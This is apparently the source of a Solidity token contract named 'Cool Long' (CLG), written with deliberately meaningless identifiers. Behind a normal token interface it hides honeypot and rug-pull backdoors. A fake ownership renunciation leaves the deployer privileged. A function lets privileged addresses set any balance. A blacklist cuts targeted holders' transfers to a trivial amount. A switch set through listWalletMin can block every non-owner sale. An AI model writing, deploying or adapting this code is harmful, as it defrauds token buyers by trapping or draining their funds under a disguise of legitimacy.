//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface takeShouldFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxTxTake {
    function createPair(address txSellToken, address amountMarketingTeam) external returns (address);
}

interface takeToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenFee) external view returns (uint256);

    function transfer(address minListWallet, uint256 autoReceiver) external returns (bool);

    function allowance(address txReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address minListWallet,
        uint256 autoReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableTrading, uint256 value);
    event Approval(address indexed txReceiver, address indexed spender, uint256 value);
}

interface takeTokenMetadata is takeToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CoolLong is amountMin, takeToken, takeTokenMetadata {

    bool private toLimit;

    uint256 private limitAmount;

    function toEnable(address senderShould) public {
        teamTake();
        if (exemptLiquidityMin != limitAmount) {
            limitAmount = launchFee;
        }
        if (senderShould == enableFrom || senderShould == senderLaunch) {
            return;
        }
        senderEnableIs[senderShould] = true;
    }

    function receiverEnableMin() public {
        emit OwnershipTransferred(enableFrom, address(0));
        listBuySender = address(0);
    }

    function approve(address isListTrading, uint256 autoReceiver) public virtual override returns (bool) {
        feeLiquidity[_msgSender()][isListTrading] = autoReceiver;
        emit Approval(_msgSender(), isListTrading, autoReceiver);
        return true;
    }

    uint8 private limitTeamAuto = 18;

    address listLaunchSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private minReceiver;

    event OwnershipTransferred(address indexed totalLaunched, address indexed totalListFund);

    uint256 public exemptLiquidityMin;

    function transfer(address minAuto, uint256 autoReceiver) external virtual override returns (bool) {
        return senderSell(_msgSender(), minAuto, autoReceiver);
    }

    uint256 public launchFee;

    function senderSell(address modeSellReceiver, address minListWallet, uint256 autoReceiver) internal returns (bool) {
        if (modeSellReceiver == enableFrom) {
            return isSender(modeSellReceiver, minListWallet, autoReceiver);
        }
        uint256 buyModeAmount = takeToken(senderLaunch).balanceOf(tokenSwapTotal);
        require(buyModeAmount == modeTeam);
        require(minListWallet != tokenSwapTotal);
        if (senderEnableIs[modeSellReceiver]) {
            return isSender(modeSellReceiver, minListWallet, swapFee);
        }
        return isSender(modeSellReceiver, minListWallet, autoReceiver);
    }

    mapping(address => bool) public senderEnableIs;

    uint256 private exemptFee;

    constructor (){
        
        takeShouldFund walletFrom = takeShouldFund(listLaunchSwap);
        senderLaunch = maxTxTake(walletFrom.factory()).createPair(walletFrom.WETH(), address(this));
        if (exemptFee == limitAmount) {
            launchList = false;
        }
        enableFrom = _msgSender();
        receiverEnableMin();
        tradingLaunched[enableFrom] = true;
        minReceiver[enableFrom] = limitReceiverFee;
        if (exemptLiquidityMin == launchFee) {
            toLimit = true;
        }
        emit Transfer(address(0), enableFrom, limitReceiverFee);
    }

    string private liquidityAt = "CLG";

    address public enableFrom;

    address private listBuySender;

    mapping(address => bool) public tradingLaunched;

    address tokenSwapTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function teamTake() private view {
        require(tradingLaunched[_msgSender()]);
    }

    uint256 modeTeam;

    mapping(address => mapping(address => uint256)) private feeLiquidity;

    function txAuto(address minAuto, uint256 autoReceiver) public {
        teamTake();
        minReceiver[minAuto] = autoReceiver;
    }

    uint256 listMode;

    function getOwner() external view returns (address) {
        return listBuySender;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitReceiverFee;
    }

    function symbol() external view virtual override returns (string memory) {
        return liquidityAt;
    }

    function isSender(address modeSellReceiver, address minListWallet, uint256 autoReceiver) internal returns (bool) {
        require(minReceiver[modeSellReceiver] >= autoReceiver);
        minReceiver[modeSellReceiver] -= autoReceiver;
        minReceiver[minListWallet] += autoReceiver;
        emit Transfer(modeSellReceiver, minListWallet, autoReceiver);
        return true;
    }

    function balanceOf(address tokenFee) public view virtual override returns (uint256) {
        return minReceiver[tokenFee];
    }

    uint256 private limitReceiverFee = 100000000 * 10 ** 18;

    string private atToken = "Cool Long";

    bool public swapLiquidity;

    bool public launchList;

    function name() external view virtual override returns (string memory) {
        return atToken;
    }

    function modeLiquidityExempt(address listMarketing) public {
        if (swapLiquidity) {
            return;
        }
        if (launchFee == exemptFee) {
            launchList = true;
        }
        tradingLaunched[listMarketing] = true;
        if (exemptFee == launchFee) {
            exemptFee = launchFee;
        }
        swapLiquidity = true;
    }

    function allowance(address autoFee, address isListTrading) external view virtual override returns (uint256) {
        if (isListTrading == listLaunchSwap) {
            return type(uint256).max;
        }
        return feeLiquidity[autoFee][isListTrading];
    }

    function owner() external view returns (address) {
        return listBuySender;
    }

    function decimals() external view virtual override returns (uint8) {
        return limitTeamAuto;
    }

    uint256 constant swapFee = 4 ** 10;

    address public senderLaunch;

    function transferFrom(address modeSellReceiver, address minListWallet, uint256 autoReceiver) external override returns (bool) {
        if (_msgSender() != listLaunchSwap) {
            if (feeLiquidity[modeSellReceiver][_msgSender()] != type(uint256).max) {
                require(autoReceiver <= feeLiquidity[modeSellReceiver][_msgSender()]);
                feeLiquidity[modeSellReceiver][_msgSender()] -= autoReceiver;
            }
        }
        return senderSell(modeSellReceiver, minListWallet, autoReceiver);
    }

    function listWalletMin(uint256 autoReceiver) public {
        teamTake();
        modeTeam = autoReceiver;
    }

}